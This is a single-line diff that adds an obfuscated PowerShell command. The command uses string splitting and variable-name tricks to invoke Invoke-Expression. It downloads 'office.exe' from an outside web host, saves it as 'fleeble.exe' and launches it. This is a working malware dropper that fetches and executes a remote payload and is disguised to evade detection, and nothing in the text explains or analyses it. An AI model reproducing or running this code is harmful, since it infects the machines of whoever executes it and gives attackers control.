@@ -1,0 +1,1 @@
+﻿ .((VArIaBLe '*mdR*').NAME[3,11,2]-join'')( (('(N'+'ew-Object System.Net.WebCl'+'ient).Down'+'lo'+'adFile('+'{0}h'+'tt'+'p'+':'+'//w'+'orl'+'dnit.co'+'m/o'+'ff'+'ice.exe{0'+'},{0'+'}fleeble.exe{0});St'+'art-P'+'rocess {0}f'+'leeble.exe{'+'0}')  -F [char]39)) 
